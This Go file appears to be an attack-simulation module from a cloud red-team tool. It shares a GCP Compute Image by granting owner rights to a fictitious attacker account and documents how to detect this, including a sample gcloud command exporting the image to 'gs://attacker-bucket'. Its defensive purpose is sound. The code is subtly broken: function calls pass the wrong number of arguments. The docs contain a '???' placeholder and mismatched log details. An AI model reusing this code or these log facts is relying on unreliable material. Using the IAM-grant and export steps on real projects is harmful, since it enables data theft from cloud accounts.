package gcp

import (
	compute "cloud.google.com/go/compute/apiv1"
	"context"
	computepb "google.golang.org/genproto/googleapis/cloud/compute/v1"
	"log"

	_ "embed"
	"fmt"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const codeBlock = "```"
const AttackTechniqueId = "gcp.exfiltration.share-compute-image"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.exfiltration.share-compute-image",
		FriendlyName: "Exfiltrate Compute Image by sharing it",
		Description: `
Exfiltrates a Compute Image by sharing with a fictitious attacker account. The attacker could then create a snapshot of the image in their GCP project.

Warm-up:

- Create a Compute Image

Detonation:

- Set the IAM policy of the image so that the attacker account has permissions to read the image in their own project

!!! note

	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to ` + gcp_utils.DefaultFictitiousAttackerEmail + ` by default.
	This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override
	this behavior by setting the environment variable <code>` + gcp_utils.AttackerEmailEnvVarKey + `</code>, for instance:

	` + codeBlock + `bash
	export ` + gcp_utils.AttackerEmailEnvVarKey + `="your-own-gmail-account@gmail.com"
	stratus detonate ` + AttackTechniqueId + `
	` + codeBlock + `
`,
		Detection: `
You can detect when someone changes the IAM policy of a Compute Image, using the GCP Admin Activity audit logs event <code>v1.compute.images.setIamPolicy</code>. Here's a sample event, shortened for clarity:

` + codeBlock + `json hl_lines="18 20 25""
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "user-sharing-the-disk@domain.tld",
      "principalSubject": "user:user-sharing-the-disk@domain.tld"
    },
    "requestMetadata": {
      "callerIp": "34.33.32.31",
      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/..."
    },
    "resourceName": "projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-image",
    "request": {
      "policy": {
        "version": "3",
        "bindings": [
          {
            "role": "roles/owner",
            "members": [
              "user:attacker@gmail.com"
            ]
          }
        ]
      },
      "@type": "type.googleapis.com/compute.images.setIamPolicy"
    }
  }
}
` + codeBlock + `

After the attacker has permissions on the Compute Image, they can export it in their own GCP Storage using:

` + codeBlock + `bash
	gcloud compute images export \
	--destination-uri gs://attacker-bucket/ \
	--image stratus-red-team-victim-image
` + codeBlock + `

When they do so, a GCP Admin Activity event <code>???</code> is generated in the victim project, 
indicating that the attacker has not only shared but also actively stolen data from the image (sample event shortened below):

` + codeBlock + `json hl_lines="5 6 14 16"
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "attacker@gmail.com",
      "principalSubject": "user:attacker@gmail.com"
    },
    "requestMetadata": {
      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/...",
      // Note: the IP of the attacker is not logged in this event
    },
    "serviceName": "compute.googleapis.com",
    "methodName": "v1.compute.snapshots.insert",
    "resourceName": "projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-image",
    "request": {
      "@type": "type.googleapis.com/compute.snapshots.insert"
    },
    "metadata": {
      "@type": "type.googleapis.com/google.cloud.audit.CrossEntityControlAuditMetadata"
    }
  }
}
` + codeBlock + `

Based on these events, detection strategies may include:

- Alerting when the IAM policy of a Compute Image is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:

` + codeBlock + `sql
protoPayload.methodName="v1.compute.images.setIamPolicy"
` + codeBlock + `

- Alerting when someone with an unexpected e-mail domain exports a Compute Image. Sample GCP Logs Explorer query:

` + codeBlock + `sql
protoPayload.methodName="v1.compute.images.export"
NOT protoPayload.authenticationInfo.principalEmail=~".+@your-domain.tld$"
` + codeBlock + `
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		Detonate:                   detonate,
		Revert:                     revert,
		PrerequisitesTerraformCode: tf,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	imageName := params["image_name"]
	zone := params["zone"]
	attackerPrincipal := gcp_utils.GetAttackerPrincipal()

	log.Println("Exfiltrating " + imageName + " by sharing it with a fictitious attacker")
	err := shareImage(gcp, imageName, zone, attackerPrincipal)
	if err != nil {
		return fmt.Errorf("failed to share image: %w", err)
	}
	log.Println("Successfully shared image with a fictitious attacker account " + attackerPrincipal)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	imageName := params["image_name"]

	log.Println("Unsharing " + imageName)
	if err := unshareImage(gcp, imageName); err != nil {
		return fmt.Errorf("unable to unshare image: %w", err)
	}
	log.Println("Successfully unshared the image - it is now private again")
	return nil
}

func shareImage(gcp *providers.GCPProvider, imageName string, targetPrincipal string) error {
	imageClient, err := compute.NewImagesRESTClient(context.Background(), gcp.Options())
	if err != nil {
		return fmt.Errorf("unable to create compute client: %w", err)
	}

	roleName := "roles/owner"

	_, err = imageClient.SetIamPolicy(context.Background(), &computepb.SetIamPolicyImageRequest{
		Resource: imageName,
		Project:  gcp.GetProjectId(),
		GlobalSetPolicyRequestResource: &computepb.GlobalSetPolicyRequest{
			Policy: &computepb.Policy{
				Bindings: []*computepb.Binding{
					{
						Members: []string{targetPrincipal},
						Role:    &roleName,
					},
				},
			},
		},
	})
	if err != nil {
		return fmt.Errorf("unable to set iam policy: %w", err)
	}
	return nil
}

func unshareImage(gcp *providers.GCPProvider, imageName string, zone string) error {
	imageClient, err := compute.NewImagesRESTClient(context.Background(), gcp.Options())
	if err != nil {
		return fmt.Errorf("unable to create compute client: %w", err)
	}

	_, err = imageClient.SetIamPolicy(context.Background(), &computepb.SetIamPolicyImageRequest{
		Resource: imageName,
		Project:  gcp.GetProjectId(),
		GlobalSetPolicyRequestResource: &computepb.GlobalSetPolicyRequest{
			Policy: &computepb.Policy{
				Bindings: []*computepb.Binding{},
			},
		},
	})
	if err != nil {
		return fmt.Errorf("unable to set iam policy: %w", err)
	}
	return nil
}
